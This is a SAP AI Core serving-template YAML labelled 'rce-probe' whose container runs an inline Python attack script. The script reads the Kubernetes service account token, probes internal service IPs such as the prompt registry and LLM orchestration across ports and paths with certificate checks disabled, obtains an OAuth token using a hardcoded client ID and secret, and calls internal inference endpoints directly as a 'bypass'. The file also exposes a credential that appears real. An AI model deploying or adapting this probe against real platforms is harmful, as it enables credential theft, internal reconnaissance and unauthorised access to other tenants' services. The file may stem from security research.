apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "1.0.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "rce-poc"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 -c "
            import urllib.request, json, ssl, os

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            def req(url, headers=None, body=None, method=None):
                h = {'Content-Type': 'application/json'}
                if headers: h.update(headers)
                data = json.dumps(body).encode() if body is not None else None
                m = method or ('POST' if data else 'GET')
                rq = urllib.request.Request(url, data=data, headers=h, method=m)
                try:
                    with urllib.request.urlopen(rq, timeout=6, context=ctx) as r:
                        return r.status, r.read(3000).decode(errors='replace')
                except urllib.error.HTTPError as e:
                    body_r = ''
                    try: body_r = e.read(2000).decode(errors='replace')
                    except: pass
                    return e.code, body_r
                except Exception as ex:
                    return 0, str(ex)[:100]

            print('[HTTPS_PROBE_START]')

            # Read service account token if available
            sa_token = ''
            for tp in ['/var/run/secrets/kubernetes.io/serviceaccount/token',
                       '/run/secrets/kubernetes.io/serviceaccount/token',
                       '/run/secrets/tokens/token']:
                try:
                    with open(tp) as f: sa_token = f.read().strip()
                    print(f'[SA_TOKEN] Found at {tp}: {sa_token[:40]}...')
                    break
                except: pass

            if not sa_token:
                print('[SA_TOKEN] None found')

            # All open ports discovered - test with HTTPS + disabled cert check
            targets = {
                'prompt-registry': ('100.107.251.106', [80, 443, 3000, 8080, 8443, 9090]),
                'prompt-registry-k8s': ('100.106.111.110', [80, 443, 8080, 8443]),
                'llm-orchestration': ('100.104.59.31', [80, 443, 8080, 8443]),
                'rage-proxy': ('100.106.172.250', [80, 443, 8080, 8443, 9090]),
                'ml-tracking': ('100.111.137.177', [80]),
            }

            paths = ['/', '/healthz', '/readyz', '/metrics',
                     '/v2/lm/promptTemplates', '/api/v1/templates', '/api/prompts',
                     '/v2/inference/deployments', '/v1/chat/completions',
                     '/chat/completions', '/openai/v1/chat/completions']

            for name, (ip, ports) in targets.items():
                for port in ports:
                    for scheme in ['http', 'https']:
                        for path in paths[:5]:  # test first 5 paths per combo
                            url = f'{scheme}://{ip}:{port}{path}'
                            code, body = req(url)
                            if code not in (0, 502, 503):
                                print(f'[HIT] {name} {scheme}:{port}{path} -> {code} | {body[:150]}')
                            elif code == 200:
                                print(f'[200] {name} {scheme}:{port}{path} BODY={body[:300]}')

            # Special: port 3000 on prompt-registry - try ALL paths
            print('[PORT3000_START]')
            for path in ['/', '/healthz', '/metrics', '/api', '/api/v1', '/api/v1/promptTemplates',
                         '/api/v2/promptTemplates', '/v1/promptTemplates', '/v2/promptTemplates',
                         '/templates', '/prompts', '/list', '/api/list',
                         '/api/v1/prompts', '/api/v2/prompts', '/internal',
                         '/debug', '/swagger', '/openapi.json', '/docs']:
                for scheme in ['http', 'https']:
                    url = f'{scheme}://100.107.251.106:3000{path}'
                    code, body = req(url)
                    if code not in (0, 502):
                        print(f'  port3000 {scheme} {path}: {code} | {body[:200]}')

            # Special: try llm-orchestration with our real XSUAA JWT (direct bypass)
            print('[ORCH_AUTH_START]')
            # We need our XSUAA token - get it from the BTP service
            # Try to get token from metadata service first
            xsuaa_token = ''
            try:
                import base64
                creds = base64.b64encode(b'sb-aicore-bb-12!b627551|aicore-xsuaa-std!b563784:aicore-bb-12-key\$gbdxl0aC0lXqLFQwlGFyB2cqAAHsAen7wWYqOl89fbw=').decode()
                rq = urllib.request.Request(
                    'https://cf-aicore-security-bb-12.authentication.eu10.hana.ondemand.com/oauth/token',
                    data=b'grant_type=client_credentials',
                    headers={'Authorization': f'Basic {creds}', 'Content-Type': 'application/x-www-form-urlencoded'})
                with urllib.request.urlopen(rq, timeout=10, context=ctx) as r:
                    td = json.loads(r.read())
                    xsuaa_token = td.get('access_token','')
                    print(f'[XSUAA_TOKEN] Got token: {xsuaa_token[:30]}...')
            except Exception as e:
                print(f'[XSUAA_TOKEN] Failed: {e}')

            if xsuaa_token:
                auth_headers = {'Authorization': f'Bearer {xsuaa_token}', 'AI-Resource-Group': 'default'}
                # Try calling llm-orchestration directly with our JWT
                for ip, port, scheme in [('100.104.59.31', 80, 'http'), ('100.104.59.31', 8080, 'http'), ('100.104.59.31', 443, 'https')]:
                    payload = {
                        'orchestration_config': {'module_configurations': {
                            'llm_module_config': {'model_name': 'gpt-4o-mini', 'model_params': {'max_tokens': 10}},
                            'templating_module_config': {'template': [{'role': 'user', 'content': 'Say hi'}]}
                        }},
                        'input_params': {}
                    }
                    code, body = req(f'{scheme}://{ip}:{port}/v2/inference/deployments/d34c0491f9fb176b/completion',
                                    headers=auth_headers, body=payload)
                    if code not in (0, 502):
                        print(f'[ORCH_DIRECT] {scheme}:{port} -> {code} | {body[:200]}')

                # Try rage-proxy as an inference gateway
                for ip, port, scheme in [('100.106.172.250', 80, 'http'), ('100.106.172.250', 8080, 'http')]:
                    for path in ['/v1/chat/completions', '/openai/v1/chat/completions', '/v2/inference']:
                        payload = {'model': 'gpt-4o-mini', 'messages': [{'role': 'user', 'content': 'hi'}], 'max_tokens': 10}
                        code, body = req(f'{scheme}://{ip}:{port}{path}', headers=auth_headers, body=payload)
                        if code not in (0, 502):
                            print(f'[RAGE] {scheme}:{port}{path} -> {code} | {body[:200]}')

            print('[PROBE_DONE]')
            " 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
